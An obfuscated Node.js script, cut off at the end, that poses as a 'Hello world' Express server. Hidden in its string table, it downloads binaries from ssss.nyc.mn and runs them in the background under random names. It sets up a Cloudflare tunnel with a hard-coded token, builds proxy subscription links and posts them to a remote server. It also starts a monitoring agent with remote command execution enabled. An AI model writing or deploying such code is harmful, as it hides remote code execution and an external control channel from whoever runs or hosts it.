const _0x59258f=_0x2e32;(function(_0x3783bc,_0x267b59){const _0x430c05=_0x2e32,_0x5249a0=_0x3783bc();while(!![]){try{const _0x40e182=-parseInt(_0x430c05(0x1a5))/0x1+-parseInt(_0x430c05(0x22d))/0x2+parseInt(_0x430c05(0x190))/0x3+parseInt(_0x430c05(0x209))/0x4+-parseInt(_0x430c05(0x1e9))/0x5*(parseInt(_0x430c05(0x1e8))/0x6)+parseInt(_0x430c05(0x19e))/0x7*(-parseInt(_0x430c05(0x1d7))/0x8)+parseInt(_0x430c05(0x1c6))/0x9;if(_0x40e182===_0x267b59)break;else _0x5249a0['push'](_0x5249a0['shift']());}catch(_0x1490d0){_0x5249a0['push'](_0x5249a0['shift']());}}}(_0x5f29,0xd28df));const _0x3cd4dc=(function(){let _0x5d369c=!![];return function(_0x433be3,_0x4d270f){const _0x52db51=_0x5d369c?function(){const _0xcc9f07=_0x2e32;if(_0x4d270f){const _0x1a436b=_0x4d270f[_0xcc9f07(0x20c)](_0x433be3,arguments);return _0x4d270f=null,_0x1a436b;}}:function(){};return _0x5d369c=![],_0x52db51;};}()),_0x337138=_0x3cd4dc(this,function(){const _0x497c1c=_0x2e32;return _0x337138[_0x497c1c(0x23b)]()[_0x497c1c(0x1ff)](_0x497c1c(0x240))[_0x497c1c(0x23b)]()[_0x497c1c(0x24b)](_0x337138)[_0x497c1c(0x1ff)](_0x497c1c(0x240));});_0x337138();const _0x1a1763=(function(){let _0x5c958e=!![];return function(_0x273788,_0x1d508d){const _0x39eef2=_0x5c958e?function(){const _0x18639d=_0x2e32;if(_0x1d508d){const _0x2415ef=_0x1d508d[_0x18639d(0x20c)](_0x273788,arguments);return _0x1d508d=null,_0x2415ef;}}:function(){};return _0x5c958e=![],_0x39eef2;};}()),_0x46116e=_0x1a1763(this,function(){const _0x1c8185=_0x2e32,_0x592bb3=function(){const _0x5850b9=_0x2e32;let _0x10d039;try{_0x10d039=Function(_0x5850b9(0x194)+_0x5850b9(0x1fd)+');')();}catch(_0x1cf665){_0x10d039=window;}return _0x10d039;},_0x3dde2d=_0x592bb3(),_0x50d307=_0x3dde2d['console']=_0x3dde2d[_0x1c8185(0x1fa)]||{},_0x33c966=[_0x1c8185(0x228),_0x1c8185(0x237),'info',_0x1c8185(0x22c),_0x1c8185(0x1ec),_0x1c8185(0x1bc),'trace'];for(let _0x477016=0x0;_0x477016<_0x33c966[_0x1c8185(0x188)];_0x477016++){const _0x3da585=_0x1a1763[_0x1c8185(0x24b)][_0x1c8185(0x243)][_0x1c8185(0x1ce)](_0x1a1763),_0x2fcc51=_0x33c966[_0x477016],_0x3d8551=_0x50d307[_0x2fcc51]||_0x3da585;_0x3da585[_0x1c8185(0x230)]=_0x1a1763[_0x1c8185(0x1ce)](_0x1a1763),_0x3da585[_0x1c8185(0x23b)]=_0x3d8551[_0x1c8185(0x23b)][_0x1c8185(0x1ce)](_0x3d8551),_0x50d307[_0x2fcc51]=_0x3da585;}});_0x46116e();const express=require(_0x59258f(0x1d6)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x59258f(0x248)),{promisify}=require(_0x59258f(0x212)),exec=promisify(require(_0x59258f(0x1b6))[_0x59258f(0x207)]),{execSync}=require(_0x59258f(0x1b6)),UPLOAD_URL=process[_0x59258f(0x213)][_0x59258f(0x18f)]||'',PROJECT_URL=process[_0x59258f(0x213)]['PROJECT_URL']||'',AUTO_ACCESS=process['env'][_0x59258f(0x1a7)]||![],FILE_PATH=process[_0x59258f(0x213)][_0x59258f(0x229)]||'./tmp',SUB_PATH=process[_0x59258f(0x213)][_0x59258f(0x211)]||_0x59258f(0x210),PORT=process['env'][_0x59258f(0x1cc)]||process[_0x59258f(0x213)][_0x59258f(0x206)]||0xbb8,UUID=process[_0x59258f(0x213)]['UUID']||_0x59258f(0x200),NEZHA_SERVER=process[_0x59258f(0x213)][_0x59258f(0x1b1)]||'',NEZHA_PORT=process['env'][_0x59258f(0x1c4)]||'',NEZHA_KEY=process[_0x59258f(0x213)][_0x59258f(0x1c9)]||'',ARGO_DOMAIN=process['env']['ARGO_DOMAIN']||_0x59258f(0x217),ARGO_AUTH=process['env'][_0x59258f(0x1c5)]||'eyJhIjoiMzRlOWU4N2IzYzViODkzNmU2NjNhZjc1NTYwMmNkODMiLCJ0IjoiNmExMDE3Y2ItODA0ZS00MmViLTkwZGUtMTAxNzI5YjFkY2U4IiwicyI6Ik5HTTRaR000TVRrdE56aGxNeTAwWkRRMExUbGhOMlF0TkdVMllqYzJabU14TkRrMSJ9',ARGO_PORT=process[_0x59258f(0x213)]['ARGO_PORT']||0x1f41,CFIP=process[_0x59258f(0x213)][_0x59258f(0x1d2)]||'162.159.153.90',CFPORT=process[_0x59258f(0x213)][_0x59258f(0x1e1)]||0x20fb,NAME=process[_0x59258f(0x213)][_0x59258f(0x19a)]||_0x59258f(0x201);!fs['existsSync'](FILE_PATH)?(fs[_0x59258f(0x19d)](FILE_PATH),console['log'](FILE_PATH+_0x59258f(0x241))):console[_0x59258f(0x228)](FILE_PATH+'\x20already\x20exists');function _0x2e32(_0x139daa,_0x3f95eb){_0x139daa=_0x139daa-0x186;const _0x58b7e5=_0x5f29();let _0x46116e=_0x58b7e5[_0x139daa];return _0x46116e;}function generateRandomName(){const _0x131a85=_0x59258f,_0x414887=_0x131a85(0x1de);let _0xf6d80e='';for(let _0x3b0698=0x0;_0x3b0698<0x6;_0x3b0698++){_0xf6d80e+=_0x414887['charAt'](Math[_0x131a85(0x233)](Math[_0x131a85(0x224)]()*_0x414887[_0x131a85(0x188)]));}return _0xf6d80e;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x59258f(0x1a1)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x59258f(0x1a1)](FILE_PATH,botName),subPath=path[_0x59258f(0x1a1)](FILE_PATH,_0x59258f(0x1b9)),listPath=path[_0x59258f(0x1a1)](FILE_PATH,_0x59258f(0x1d1)),bootLogPath=path[_0x59258f(0x1a1)](FILE_PATH,_0x59258f(0x202)),configPath=path[_0x59258f(0x1a1)](FILE_PATH,_0x59258f(0x23a));function deleteNodes(){const _0x5eda13=_0x59258f;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x5b0803;try{_0x5b0803=fs[_0x5eda13(0x1fb)](subPath,_0x5eda13(0x1ab));}catch{return null;}const _0x288999=Buffer[_0x5eda13(0x1a6)](_0x5b0803,_0x5eda13(0x18b))[_0x5eda13(0x23b)](_0x5eda13(0x1ab)),_0x4ba5b6=_0x288999[_0x5eda13(0x244)]('\x0a')[_0x5eda13(0x187)](_0x9fb987=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x9fb987));if(_0x4ba5b6[_0x5eda13(0x188)]===0x0)return;return axios[_0x5eda13(0x1c3)](UPLOAD_URL+_0x5eda13(0x1f7),JSON['stringify']({'nodes':_0x4ba5b6}),{'headers':{'Content-Type':_0x5eda13(0x22b)}})['catch'](_0x190670=>{return null;}),null;}catch(_0x15d4b4){return null;}}function cleanupOldFiles(){const _0x1238cb=_0x59258f;try{const _0x569d6b=fs[_0x1238cb(0x255)](FILE_PATH);_0x569d6b['forEach'](_0x15197f=>{const _0x5616d9=_0x1238cb,_0x5695da=path['join'](FILE_PATH,_0x15197f);try{const _0x24626d=fs[_0x5616d9(0x203)](_0x5695da);_0x24626d[_0x5616d9(0x1cf)]()&&fs[_0x5616d9(0x196)](_0x5695da);}catch(_0x36e883){}});}catch(_0x1d4ff8){}}function _0x5f29(){const _0x20569b=['\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','vmess','then','data','listen','abcdefghijklmnopqrstuvwxyz','nohup\x20','country_code','CFPORT','status','platform','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','block','http\x20server\x20is\x20running\x20on\x20port:','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','6LHzNBO','5322250ymNOLI','\x0a\x0avmess://','org','exception','clear','php\x20running\x20error:\x20','https://oooo.serv00.net/add-url','Empowerment\x20failed\x20for\x20','tunnel.json','TunnelSecret','https://ipapi.co/json/','false','\x20>/dev/null\x202>&1','Content-Type','/api/delete-nodes','443','Download\x20','console','readFileSync','2087','{}.constructor(\x22return\x20this\x22)(\x20)','?encryption=none&security=tls&sni=','search','4e067eab-b7bb-4156-b789-d3eca77aa29c','date','boot.log','statSync','unlink','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','PORT','exec','charAt','83592iEEFyO','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','apply','--tls','/tunnel.yml\x20run','npm\x20running\x20error:\x20','lwy','SUB_PATH','util','env','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','https://arm64.ssss.nyc.mn/agent','del\x20/f\x20/q\x20','date.96007.ggff.net','pop','App\x20is\x20running','xtls-rprx-vision','\x0aclient_secret:\x20','createWriteStream','127.0.0.1','/dev/null','https://amd64.ssss.nyc.mn/bot','\x0avless://','2083','Error\x20downloading\x20files:','/trojan-argo','random','win32','Subscription\x20uploaded\x20successfully','arm','log','FILE_PATH','Nodes\x20uploaded\x20successfully','application/json','error','1087384vqdYKG','has','Add\x20automatic\x20access\x20task\x20faild:\x20','__proto__','fileUrl','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','floor','\x0a\x20\x20tunnel:\x20','\x20is\x20running','Empowerment\x20success\x20for\x20','warn','stringify','Unknown','config.json','toString','blackhole','test','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','https://amd64.ssss.nyc.mn/v1','(((.+)+)+)+$','\x20is\x20created','close','prototype','split','unshift','/vmess-argo','ArgoDomain:','path','Hello\x20world!','get','constructor','Unhandled\x20error\x20in\x20startserver:','fileName','http','tcp','includes','&fp=firefox&type=ws&host=','Error\x20executing\x20command:\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','\x20>/dev/null\x202>&1\x20&','readdirSync','direct','\x20-p\x20','https://amd64.ssss.nyc.mn/web','/sub.txt\x20saved\x20successfully','stream','filter','length','tls','Skipping\x20adding\x20automatic\x20access\x20task','base64','2096','/vless-argo','forEach','UPLOAD_URL','3115440KnQDOq','2053','/config.json\x20>/dev/null\x202>&1\x20&','success','return\x20(function()\x20','match','unlinkSync','true','text/plain;\x20charset=utf-8','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','NAME','quic','ARGO_DOMAIN:','mkdirSync','10481135KLzhAD','countryCode','tunnel.yml','join','none','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','Error\x20in\x20startserver:','68395bEBRYN','from','AUTO_ACCESS','.exe\x20>\x20nul\x202>&1','\x20failed:\x20','\x20-c\x20','utf-8','https+local://8.8.8.8/dns-query','basename','vless','freedom','catch','NEZHA_SERVER','rm\x20-rf\x20','8443','writeFileSync','\x20>\x20nul\x202>&1','child_process','\x20-s\x20','map','sub.txt','\x20-c\x20\x22','https://amd64.ssss.nyc.mn/agent','table','https://arm64.ssss.nyc.mn/web','response','arch','all','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','existsSync','post','NEZHA_PORT','ARGO_AUTH','26792055SxLGMd','push','send','NEZHA_KEY','\x22\x20>\x20/dev/null\x202>&1','arm64','SERVER_PORT','chmod','bind','isFile','firefox','list.txt','CFIP','https://arm64.ssss.nyc.mn/bot','/api/add-nodes','trojan','express','8vkjCMz','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel'];_0x5f29=function(){return _0x20569b;};return _0x5f29();}app[_0x59258f(0x24a)]('/',function(_0x52b4b8,_0x37e788){const _0x5a194b=_0x59258f;_0x37e788[_0x5a194b(0x1c8)](_0x5a194b(0x249));});async function generateConfig(){const _0x5b751d=_0x59258f,_0x190f97={'log':{'access':_0x5b751d(0x21e),'error':_0x5b751d(0x21e),'loglevel':_0x5b751d(0x1a2)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x5b751d(0x1ae),'settings':{'clients':[{'id':UUID,'flow':_0x5b751d(0x21a)}],'decryption':_0x5b751d(0x1a2),'fallbacks':[{'dest':0xbb9},{'path':_0x5b751d(0x18d),'dest':0xbba},{'path':_0x5b751d(0x246),'dest':0xbbb},{'path':_0x5b751d(0x223),'dest':0xbbc}]},'streamSettings':{'network':_0x5b751d(0x24f)}},{'port':0xbb9,'listen':_0x5b751d(0x21d),'protocol':_0x5b751d(0x1ae),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x5b751d(0x24f),'security':'none'}},{'port':0xbba,'listen':_0x5b751d(0x21d),'protocol':_0x5b751d(0x1ae),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x5b751d(0x1a2)},'streamSettings':{'network':'ws','security':_0x5b751d(0x1a2),'wsSettings':{'path':_0x5b751d(0x18d)}},'sniffing':{'enabled':!![],'destOverride':[_0x5b751d(0x24e),'tls',_0x5b751d(0x19b)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x5b751d(0x21d),'protocol':_0x5b751d(0x1da),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x5b751d(0x24e),_0x5b751d(0x189),_0x5b751d(0x19b)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x5b751d(0x1d5),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x5b751d(0x1a2),'wsSettings':{'path':_0x5b751d(0x223)}},'sniffing':{'enabled':!![],'destOverride':[_0x5b751d(0x24e),'tls',_0x5b751d(0x19b)],'metadataOnly':![]}}],'dns':{'servers':[_0x5b751d(0x1ac)]},'outbounds':[{'protocol':_0x5b751d(0x1af),'tag':_0x5b751d(0x256)},{'protocol':_0x5b751d(0x23c),'tag':_0x5b751d(0x1e5)}]};fs[_0x5b751d(0x1b4)](path[_0x5b751d(0x1a1)](FILE_PATH,_0x5b751d(0x23a)),JSON['stringify'](_0x190f97,null,0x2));}function getSystemArchitecture(){const _0xe71360=_0x59258f,_0x5ae96d=os[_0xe71360(0x1bf)]();return _0x5ae96d===_0xe71360(0x227)||_0x5ae96d===_0xe71360(0x1cb)||_0x5ae96d==='aarch64'?_0xe71360(0x227):'amd';}function downloadFile(_0x1bfa88,_0x4e692b,_0x5c043b){const _0x42def1=_0x59258f,_0x2fffe4=_0x1bfa88;!fs['existsSync'](FILE_PATH)&&fs[_0x42def1(0x19d)](FILE_PATH,{'recursive':!![]});const _0x351716=fs[_0x42def1(0x21c)](_0x2fffe4);axios({'method':_0x42def1(0x24a),'url':_0x4e692b,'responseType':_0x42def1(0x186)})[_0x42def1(0x1db)](_0xd251ac=>{const _0x12dcf0=_0x42def1;_0xd251ac[_0x12dcf0(0x1dc)]['pipe'](_0x351716),_0x351716['on']('finish',()=>{const _0x5ecc6c=_0x12dcf0;_0x351716[_0x5ecc6c(0x242)](),console[_0x5ecc6c(0x228)](_0x5ecc6c(0x1f9)+path[_0x5ecc6c(0x1ad)](_0x2fffe4)+'\x20successfully'),_0x5c043b(null,_0x2fffe4);}),_0x351716['on'](_0x12dcf0(0x22c),_0x564038=>{const _0x3b7284=_0x12dcf0;fs[_0x3b7284(0x204)](_0x2fffe4,()=>{});const _0xb58e29=_0x3b7284(0x1f9)+path[_0x3b7284(0x1ad)](_0x2fffe4)+_0x3b7284(0x1a9)+_0x564038['message'];console[_0x3b7284(0x22c)](_0xb58e29),_0x5c043b(_0xb58e29);});})[_0x42def1(0x1b0)](_0x3348ac=>{const _0x25935b=_0x42def1,_0x1f5c9c=_0x25935b(0x1f9)+path[_0x25935b(0x1ad)](_0x2fffe4)+_0x25935b(0x1a9)+_0x3348ac['message'];console[_0x25935b(0x22c)](_0x1f5c9c),_0x5c043b(_0x1f5c9c);});}async function downloadFilesAndRun(){const _0x5a51cc=_0x59258f,_0x109b77=getSystemArchitecture(),_0x2fde95=getFilesForArchitecture(_0x109b77);if(_0x2fde95[_0x5a51cc(0x188)]===0x0){console['log'](_0x5a51cc(0x232));return;}const _0x44feab=_0x2fde95[_0x5a51cc(0x1b8)](_0x322dc3=>{return new Promise((_0x25b005,_0x35f377)=>{const _0x2009e5=_0x2e32;downloadFile(_0x322dc3[_0x2009e5(0x24d)],_0x322dc3[_0x2009e5(0x231)],(_0x22bb91,_0x3b3922)=>{_0x22bb91?_0x35f377(_0x22bb91):_0x25b005(_0x3b3922);});});});try{await Promise[_0x5a51cc(0x1c0)](_0x44feab);}catch(_0x2ce1ef){console['error'](_0x5a51cc(0x222),_0x2ce1ef);return;}function _0x49bb48(_0x429912){const _0x2f9bbb=0x1fd;_0x429912['forEach'](_0x2b4a69=>{const _0x394dee=_0x2e32;fs[_0x394dee(0x1c2)](_0x2b4a69)&&fs[_0x394dee(0x1cd)](_0x2b4a69,_0x2f9bbb,_0x15e9a6=>{const _0x4a0bbb=_0x394dee;_0x15e9a6?console[_0x4a0bbb(0x22c)](_0x4a0bbb(0x1f0)+_0x2b4a69+':\x20'+_0x15e9a6):console[_0x4a0bbb(0x228)](_0x4a0bbb(0x236)+_0x2b4a69+':\x20'+_0x2f9bbb['toString'](0x8));});});}const _0x1ed3f0=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x49bb48(_0x1ed3f0);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x28b29f=NEZHA_SERVER[_0x5a51cc(0x250)](':')?NEZHA_SERVER['split'](':')[_0x5a51cc(0x218)]():'',_0xed036f=new Set(['443',_0x5a51cc(0x1b3),_0x5a51cc(0x18c),_0x5a51cc(0x1fc),_0x5a51cc(0x221),_0x5a51cc(0x191)]),_0x3f1f00=_0xed036f[_0x5a51cc(0x22e)](_0x28b29f)?_0x5a51cc(0x197):_0x5a51cc(0x1f4),_0x43ba1a=_0x5a51cc(0x21b)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x5a51cc(0x1d9)+_0x3f1f00+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x5a51cc(0x1b4)](path[_0x5a51cc(0x1a1)](FILE_PATH,'config.yaml'),_0x43ba1a);const _0x48f9d9='nohup\x20'+phpPath+_0x5a51cc(0x1ba)+FILE_PATH+_0x5a51cc(0x1a3);try{await exec(_0x48f9d9),console[_0x5a51cc(0x228)](phpName+_0x5a51cc(0x235)),await new Promise(_0x18dcf5=>setTimeout(_0x18dcf5,0x3e8));}catch(_0x22beef){console[_0x5a51cc(0x22c)](_0x5a51cc(0x1ee)+_0x22beef);}}else{let _0x7df117='';const _0x15cdce=[_0x5a51cc(0x1f8),_0x5a51cc(0x1b3),'2096',_0x5a51cc(0x1fc),_0x5a51cc(0x221),_0x5a51cc(0x191)];_0x15cdce['includes'](NEZHA_PORT)&&(_0x7df117=_0x5a51cc(0x20d));const _0x2ec1ba='nohup\x20'+npmPath+_0x5a51cc(0x1b7)+NEZHA_SERVER+':'+NEZHA_PORT+_0x5a51cc(0x257)+NEZHA_KEY+'\x20'+_0x7df117+_0x5a51cc(0x1e7);try{await exec(_0x2ec1ba),console['log'](npmName+_0x5a51cc(0x235)),await new Promise(_0x47bd2d=>setTimeout(_0x47bd2d,0x3e8));}catch(_0x2a5a15){console[_0x5a51cc(0x22c)](_0x5a51cc(0x20f)+_0x2a5a15);}}}else console[_0x5a51cc(0x228)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x2b661a=_0x5a51cc(0x1df)+webPath+_0x5a51cc(0x1aa)+FILE_PATH+_0x5a51cc(0x192);try{await exec(_0x2b661a),console[_0x5a51cc(0x228)](webName+_0x5a51cc(0x235)),await new Promise(_0x2c04e6=>setTimeout(_0x2c04e6,0x3e8));}catch(_0x515e9d){console['error']('web\x20running\x20error:\x20'+_0x515e9d);}if(fs[_0x5a51cc(0x1c2)](botPath)){let _0x567983;if(ARGO_AUTH[_0x5a51cc(0x195)](/^[A-Z0-9a-z=]{120,250}$/))_0x567983='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x567983='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x5a51cc(0x20e):_0x567983=_0x5a51cc(0x23e)+FILE_PATH+_0x5a51cc(0x20a)+ARGO_PORT;try{await exec(_0x5a51cc(0x1df)+botPath+'\x20'+_0x567983+_0x5a51cc(0x254)),console[_0x5a51cc(0x228)](botName+_0x5a51cc(0x235)),await new Promise(_0x295f1f=>setTimeout(_0x295f1f,0x7d0));}catch(_0x52d21c){console[_0x5a51cc(0x22c)](_0x5a51cc(0x252)+_0x52d21c);}}await new Promise(_0x1017ea=>setTimeout(_0x1017ea,0x1388));}function getFilesForArchitecture(_0x3c7484){const _0x812045=_0x59258f;let _0x51a360;_0x3c7484===_0x812045(0x227)?_0x51a360=[{'fileName':webPath,'fileUrl':_0x812045(0x1bd)},{'fileName':botPath,'fileUrl':_0x812045(0x1d3)}]:_0x51a360=[{'fileName':webPath,'fileUrl':_0x812045(0x258)},{'fileName':botPath,'fileUrl':_0x812045(0x21f)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x45ff2e=_0x3c7484===_0x812045(0x227)?_0x812045(0x215):_0x812045(0x1bb);_0x51a360[_0x812045(0x245)]({'fileName':npmPath,'fileUrl':_0x45ff2e});}else{const _0xb8956e=_0x3c7484===_0x812045(0x227)?'https://arm64.ssss.nyc.mn/v1':_0x812045(0x23f);_0x51a360[_0x812045(0x245)]({'fileName':phpPath,'fileUrl':_0xb8956e});}}return _0x51a360;}function argoType(){const _0x35bae1=_0x59258f;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x35bae1(0x228)](_0x35bae1(0x199));return;}if(ARGO_AUTH['includes'](_0x35bae1(0x1f2))){fs[_0x35bae1(0x1b4)](path['join'](FILE_PATH,_0x35bae1(0x1f1)),ARGO_AUTH);const _0xc167f4=_0x35bae1(0x234)+ARGO_AUTH[_0x35bae1(0x244)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path['join'](FILE_PATH,_0x35bae1(0x1f1))+_0x35bae1(0x20b)+ARGO_DOMAIN+_0x35bae1(0x1c1)+ARGO_PORT+_0x35bae1(0x1e4);fs['writeFileSync'](path[_0x35bae1(0x1a1)](FILE_PATH,_0x35bae1(0x1a0)),_0xc167f4);}else console[_0x35bae1(0x228)](_0x35bae1(0x1d8));}async function extractDomains(){const _0x16a8de=_0x59258f;let _0x8ace0;if(ARGO_AUTH&&ARGO_DOMAIN)_0x8ace0=ARGO_DOMAIN,console['log'](_0x16a8de(0x19c),_0x8ace0),await _0x226929(_0x8ace0);else try{const _0x33c57d=fs[_0x16a8de(0x1fb)](path[_0x16a8de(0x1a1)](FILE_PATH,_0x16a8de(0x202)),'utf-8'),_0x2e8e68=_0x33c57d[_0x16a8de(0x244)]('\x0a'),_0x50097b=[];_0x2e8e68[_0x16a8de(0x18e)](_0x5bda03=>{const _0x3d762d=_0x5bda03['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x3d762d){const _0x31a142=_0x3d762d[0x1];_0x50097b['push'](_0x31a142);}});if(_0x50097b[_0x16a8de(0x188)]>0x0)_0x8ace0=_0x50097b[0x0],console['log'](_0x16a8de(0x247),_0x8ace0),await _0x226929(_0x8ace0);else{console['log'](_0x16a8de(0x214)),fs[_0x16a8de(0x196)](path[_0x16a8de(0x1a1)](FILE_PATH,_0x16a8de(0x202)));async function _0x2c227c(){const _0x5f4104=_0x16a8de;try{process[_0x5f4104(0x1e3)]===_0x5f4104(0x225)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x5f4104(0x1a8)):await exec('pkill\x20-f\x20\x22['+botName[_0x5f4104(0x208)](0x0)+']'+botName['substring'](0x1)+_0x5f4104(0x1ca));}catch(_0x482c1e){}}_0x2c227c(),await new Promise(_0xcbc3c=>setTimeout(_0xcbc3c,0xbb8));const _0x43cdc5=_0x16a8de(0x23e)+FILE_PATH+_0x16a8de(0x20a)+ARGO_PORT;try{await exec(_0x16a8de(0x1df)+botPath+'\x20'+_0x43cdc5+'\x20>/dev/null\x202>&1\x20&'),console[_0x16a8de(0x228)](botName+_0x16a8de(0x235)),await new Promise(_0x3ac3fa=>setTimeout(_0x3ac3fa,0xbb8)),await extractDomains();}catch(_0x3bd6a1){console['error'](_0x16a8de(0x252)+_0x3bd6a1);}}}catch(_0x299118){console[_0x16a8de(0x22c)]('Error\x20reading\x20boot.log:',_0x299118);}async function _0xf38e34(){const _0x2b9ff7=_0x16a8de;try{const _0x48b9c6=await axios[_0x2b9ff7(0x24a)](_0x2b9ff7(0x1f3),{'timeout':0xbb8});if(_0x48b9c6[_0x2b9ff7(0x1dc)]&&_0x48b9c6[_0x2b9ff7(0x1dc)][_0x2b9ff7(0x1e0)]&&_0x48b9c6['data'][_0x2b9ff7(0x1eb)])return _0x48b9c6['data'][_0x2b9ff7(0x1e0)]+'_'+_0x48b9c6[_0x2b9ff7(0x1dc)][_0x2b9ff7(0x1eb)];}catch(_0x89c95b){try{const _0x2c69b7=await axios[_0x2b9ff7(0x24a)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x2c69b7[_0x2b9ff7(0x1dc)]&&_0x2c69b7[_0x2b9ff7(0x1dc)][_0x2b9ff7(0x1e2)]===_0x2b9ff7(0x193)&&_0x2c69b7[_0x2b9ff7(0x1dc)][_0x2b9ff7(0x19f)]&&_0x2c69b7[_0x2b9ff7(0x1dc)][_0x2b9ff7(0x1eb)])return _0x2c69b7['data']['countryCode']+'_'+_0x2c69b7['data']['org'];}catch(_0x1b14fe){}}return _0x2b9ff7(0x239);}async function _0x226929(_0xf06e62){const _0x4b7309=await _0xf38e34(),_0x15b15f=NAME?NAME+'-'+_0x4b7309:_0x4b7309;return new Promise(_0x5f3f13=>{setTimeout(()=>{const _0x280d07=_0x2e32,_0x41a083={'v':'2','ps':''+_0x15b15f,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':'none','host':_0xf06e62,'path':'/vmess-argo?ed=2560','tls':'tls','sni':_0xf06e62,'alpn':'','fp':_0x280d07(0x1d0)},_0x46623c=_0x280d07(0x220)+UUID+'@'+CFIP+':'+CFPORT+_0x280d07(0x1fe)+_0xf06e62+_0x280d07(0x251)+_0xf06e62+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x15b15f+_0x280d07(0x1ea)+Buffer['from'](JSON[_0x280d07(0x238)](_0x41a083))[_0x280d07(0x23b)](_0x280d07(0x18b))+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0xf06e62+_0x280d07(0x251)+_0xf06e62+_0x280d07(0x253)+_0x15b15f+'\x0a\x20\x20\x20\x20';console[_0x280d07(0x228)](Buffer['from'](_0x46623c)[_0x280d07(0x23b)](_0x280d07(0x18b))),fs[_0x280d07(0x1b4)](subPath,Buffer['from'](_0x46623c)['toString'](_0x280d07(0x18b))),console[_0x280d07(0x228)](FILE_PATH+_0x280d07(0x259)),uploadNodes(),app[_0x280d07(0x24a)]('/'+SUB_PATH,(_0x24d88f,_0x56de4f)=>{const _0x405146=_0x280d07,_0x4ae9d0=Buffer[_0x405146(0x1a6)](_0x46623c)[_0x405146(0x23b)](_0x405146(0x18b));_0x56de4f['set'](_0x405146(0x1f6),_0x405146(0x198)),_0x56de4f[_0x405146(0x1c8)](_0x4ae9d0);}),_0x5f3f13(_0x46623c);},0x7d0);});}}async function uploadNodes(){const _0x20b8da=_0x59258f;if(UPLOAD_URL&&PROJECT_URL){const _0x1324d9=PROJECT_URL+'/'+SUB_PATH,_0x720567={'subscription':[_0x1324d9]};try{const _0x47a06b=await axios[_0x20b8da(0x1c3)](UPLOAD_URL+'/api/add-subscriptions',_0x720567,{'headers':{'Content-Type':_0x20b8da(0x22b)}});return _0x47a06b&&_0x47a06b[_0x20b8da(0x1e2)]===0xc8?(console[_0x20b8da(0x228)](_0x20b8da(0x226)),_0x47a06b):null;}catch(_0xe32bc8){if(_0xe32bc8[_0x20b8da(0x1be)]){if(_0xe32bc8[_0x20b8da(0x1be)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x20b8da(0x1c2)](listPath))return;const 